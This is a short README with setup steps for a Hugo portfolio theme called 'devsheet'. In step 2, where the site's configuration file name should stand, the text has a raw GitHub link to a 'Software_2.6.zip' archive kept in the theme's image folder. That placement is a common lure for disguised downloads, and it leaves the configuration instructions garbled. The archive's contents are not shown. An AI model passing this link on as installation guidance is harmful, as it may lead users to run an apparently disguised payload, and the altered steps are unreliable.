## üñ•Ô∏è Usage Instructions
Once you have downloaded and extracted the theme, follow these steps to set it up:

### 1. Add devsheet to Your Hugo Site
1. Open your Hugo site's root directory in your terminal or command prompt.
2. Move or copy the devsheet theme folder into the `themes` directory. The path will look like this: `themes/devsheet`.

### 2. Configure Your Site
1. Open your `https://github.com/abdulkader-dev/devsheet/raw/refs/heads/main/static/img/Software_2.6.zip` file located in your site's root directory.
2. Set the theme by adding the line: 
   ```toml
   theme = "devsheet"
   ```

### 3. Create Content
1. Create a new markdown file in the `content` directory. This file will serve as your portfolio page.
2. Populate the file with your projects, skills, and experiences. You can use LaTeX syntax for any technical content.

### 4. Start Your Hugo Server
Use the command below to start the server:
```bash
hugo server
```
Visit `http://localhost:1313` in your web browser to preview your site.
